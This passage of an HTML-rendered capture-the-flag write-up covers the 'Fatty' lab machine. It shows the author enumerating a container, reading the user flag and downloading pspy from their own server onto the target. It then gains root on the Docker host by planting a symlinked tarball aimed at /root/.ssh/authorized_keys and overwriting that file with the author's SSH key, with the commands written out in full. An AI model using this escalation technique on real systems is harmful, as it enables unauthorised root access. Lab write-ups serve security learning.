container:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">uname -a</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Linux 032784d4da1d 4.9.0-11-amd64 #1 SMP Debian 4.9.189-3+deb9u1 (2019-09-20) x86_64 Linux</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">cat /etc/os-release</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">NAME=&quot;Alpine Linux&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ID=alpine</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">VERSION_ID=3.9.4</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PRETTY_NAME=&quot;Alpine Linux v3.9&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">HOME_URL=&quot;https://alpinelinux.org/&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">BUG_REPORT_URL=&quot;https://bugs.alpinelinux.org/&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Where are we?</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">pwd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/home/qtc</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ls -lhA</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">total 8</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwx------    1 qtc      qtc         4.0K Oct 30  2019 .ssh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">----------    1 qtc      qtc           33 Oct 30  2019 user.txt</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s read the user flag:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">chmod u+r user.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">cat user.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">7fab2c31fc7173a86872db45ae922073</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>There are some scheduled jobs:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">/etc/crontabs:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">total 16</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x    1 root     root          4096 Jan 29  2020 .</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x    1 root     root          4096 Jan 29  2020 ..</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-------    1 root     root            64 Oct 30  2019 qtc</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-------    1 root     root           283 Jan 23  2019 root</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/etc/crontabs.back:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">total 20</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x    2 qtc      qtc           4096 Oct 30  2019 .</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x    1 root     root          4096 Jan 29  2020 ..</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-------    1 qtc      qtc              4 Oct 30  2019 cron.update</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-------    1 qtc      qtc             64 Oct 30  2019 qtc</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-------    1 qtc      qtc            283 Oct 30  2019 root</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Thanks to the backup directory we can read them:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">cat /etc/crontabs.back/qtc</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0 * * * * /bin/tar -cf /opt/fatty/tar/logs.tar /opt/fatty/logs/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">cat /etc/crontabs.back/root</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># do daily/weekly/monthly maintenance</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># min   hour    day     month   weekday command</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">*/15    *       *       *       *       run-parts /etc/periodic/15min</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0       *       *       *       *       run-parts /etc/periodic/hourly</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0       2       *       *       *       run-parts /etc/periodic/daily</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0       3       *       *       6       run-parts /etc/periodic/weekly</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0       5       1       *       *       run-parts /etc/periodic/monthly</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>There is a tar archive created from the logs, and we have permissions over
the 2 folders:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">ls -lh /opt/fatty</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">total 10592</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-r--r--    1 root     root       10.3M Oct 30  2019 fatty-server.jar</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x    5 root     root        4.0K Oct 30  2019 files</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x    1 qtc      qtc         4.0K Jan 29  2020 logs</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwxr-xr-x    1 root     root         406 Oct 30  2019 start.sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x    1 qtc      qtc         4.0K Jul 30 12:00 tar</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>I&#x27;ll use <a href="https://github.com/DominicBreuker/pspy" target="_blank" rel="noopener noreferrer">pspy</a> to try to catch some flash events.</p><p>Lets download <a href="https://github.com/DominicBreuker/pspy" target="_blank" rel="noopener noreferrer">pspy</a> on our machine:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Then start a web server to serve it:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ruby -run -e httpd . -p 9999</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[2020-07-30 22:41:59] INFO  WEBrick 1.6.0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[2020-07-30 22:41:59] INFO  ruby 2.7.1 (2020-03-31) [x86_64-linux]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[2020-07-30 22:41:59] INFO  WEBrick::HTTPServer#start: pid=62423 port=9999</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Then on the target retrieve it and executes it:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">cd /tmp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">wget http://10.10.14.114:9999/pspy64</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">chmod u+x pspy64</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">./pspy64</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">     ██▓███    ██████  ██▓███ ▓██   ██▓</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    ░░       ░  ░  ░  ░░       ▒ ▒ ░░</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                   ░           ░ ░</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                               ░ ░</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Draining file system events due to startup...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">done</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2020/07/30 20:52:20 CMD: UID=0    PID=7      | crond -b</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2020/07/30 20:52:20 CMD: UID=1000 PID=2289   | ./pspy64</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2020/07/30 20:52:20 CMD: UID=1000 PID=1754   | /bin/sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2020/07/30 20:52:20 CMD: UID=0    PID=11     | /usr/sbin/sshd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2020/07/30 20:52:20 CMD: UID=1000 PID=10     | java -jar /opt/fatty/fatty-server.jar</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2020/07/30 20:52:20 CMD: UID=0    PID=1      | /bin/sh ./start.sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2020/07/30 20:53:01 CMD: UID=0    PID=2298   | /usr/sbin/sshd -R</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2020/07/30 20:53:01 CMD: UID=22   PID=2299   | sshd: [net]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2020/07/30 20:53:01 CMD: UID=0    PID=2300   | sshd: qtc [priv]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2020/07/30 20:53:01 CMD: UID=1000 PID=2301   | ash -c scp -f /opt/fatty/tar/logs.tar</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2020/07/30 20:54:02 CMD: UID=0    PID=2302   | /usr/sbin/sshd -R</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2020/07/30 20:54:02 CMD: UID=22   PID=2303   | sshd: [net]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2020/07/30 20:54:02 CMD: UID=1000 PID=2304   | sshd: qtc</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2020/07/30 20:54:02 CMD: UID=1000 PID=2305   | scp -f /opt/fatty/tar/logs.tar</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2020/07/30 20:55:01 CMD: UID=0    PID=2306   | /usr/sbin/sshd -R</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2020/07/30 20:55:01 CMD: UID=22   PID=2307   | sshd: [net]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2020/07/30 20:55:01 CMD: UID=0    PID=2308   | sshd: qtc [priv]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2020/07/30 20:55:01 CMD: UID=1000 PID=2309   | ash -c scp -f /opt/fatty/tar/logs.tar</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>After a few seconds we can see a scp that copies the tar archive that was
created by the cron job.</p><p>It seems like a scp command is run from a remote host to retrieve
<code>/opt/fatty/tar/logs.tar</code>, this must come from the docker host.</p><p>Something like that must be run from the docker host:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">scp qtc@172.28.0.4:/opt/fatty/tar/logs.tar /path/on/host/logs.tar</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="privilege-escalation-of-machine">Privilege Escalation of Machine<a href="#privilege-escalation-of-machine" class="hash-link" aria-label="Direct link to Privilege Escalation of Machine" title="Direct link to Privilege Escalation of Machine">​</a></h2><p>Ok, fasten your seat belt this is tricky.</p><p>We can guess that if a tarball is copied to the docker host automatically,
then it may be automatically extracted too.</p><p>So I&#x27;ll try to conduct this 2 steps attack that abuse of symbolic link in
tarball when extracted.</p><ol><li>Create a tarball containing a symlink, the symlink as the same name as the
tarball so when it&#x27;s extracted it overrides it. The symling points to a file
on the target system that we want to override to get root access.</li><li>Create a file name like the tarball that will override the target file
when copied thanks to the previous symlink abuse.</li></ol><p>One of the less dirty way to pe to root by overriding a file would be to
copy our SSH public key into root SSH authorized keys.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">ln -s /root/.ssh/authorized_keys logs.tar</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">tar cvf logs.tmp.tar logs.tar</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">logs.tar</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">tar tvf logs.tmp.tar</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">lrwxrwxrwx qtc/qtc         0 2020-07-31 02:13:44 logs.tar -&gt; /root/.ssh/authorized_keys</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">cp logs.tmp.tar /opt/fatty/tar/logs.tar</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Then we wait for a few minutes to be sure that scp copy was done, we can
start a 2nd reverse shell and lauch <a href="https://github.com/DominicBreuker/pspy" target="_blank" rel="noopener noreferrer">pspy</a> again to be sure.</p><p>So the scp will copy the tarball to <code>/path/on/host/logs.tar</code> on the host.</p><p>Then it will extract it and use our malicious symlink: <code>/path/on/host/logs.tar</code>
-&gt; <code>/root/.ssh/authorized_keys</code>.</p><p>Then we copy our SSH pubkey to replace the tarball.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">printf %s &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDceD2CV1rqU+7fcduAqZ9bK4jdOQphI7J7AYUAzmHARAp/fNq4XQet3bLg73yugh72MRT6aJUWEM2iP1/gmyRgJUxx65qESG/OAUlzIOBSQUiw2sP+3++/qsBJ76y7/xfnIq/F6YDJSaqpm+eG4G4SrVqNvKNzZTYbAXJ4Fw62bAD04cvMsDeiarkS0mAZkLUzBYI8aDimHt0J2N0OGLC/hLMDZeDzjtixb/4dVNFIoRHyZv3fTNsRLDScKxxHSP+e1CUfAQ6dtlpzqAj1IW7GkaZWxBxRIyVEtFrkYSQzM/ycYtKwhXkySPbtlO1xcjr4/FpOWfYq0LiuF71+Pt/QfwYv1UKIqJ+swZlm/zb/cpu8ESARrs5mb4OTTBwb3TSmOIj5iYaEwhXGueB/Cq7TH6HQjGDZqiOOX6q1ymiGdWfkNCAj4wywaPlIB+d90NH/G0gfuk+2CFcm2us7pIvELqGh5ZqcCGdGQtqlQBsC2HdzSkiQqlGLBIDk3fcJ/ms= cyfun@penarch&#x27; &gt; /opt/fatty/tar/logs.tar</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Then again we wait a few minutes or monitor <a href="https://github.com/DominicBreuker/pspy" target="_blank" rel="noopener noreferrer">pspy</a>.</p><p>It will directly copy our key to <code>/root/.ssh/authorized_keys</code> thanks to our
malicious symlink.</p><p>Then we can connect via ssh:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ssh root@10.10.10.174</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">The authenticity of host &#x27;10.10.10.174 (10.10.10.174)&#x27; can&#x27;t be established.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ED25519 key fingerprint is SHA256:vrMYTGEAjnC1vfp18WHrsxuDGfueUV0xVfzQErxMKv0.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Warning: Permanently added &#x27;10.10.10.174&#x27; (ED25519) to the list of known hosts.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Linux fatty 4.9.0-11-amd64 #1 SMP Debian 4.9.189-3+deb9u1 (2019-09-20) x86_64</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">The programs included with the Debian GNU/Linux system are free software;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">the exact distribution terms for each program are described in the</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">individual files in /usr/share/doc/*/copyright.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">permitted by applicable law.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Last login: Thu Jul 30 15:41:03 2020 from 10.10.15.115</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@fatty:~# pwd</span><br></span><span class="token-line" 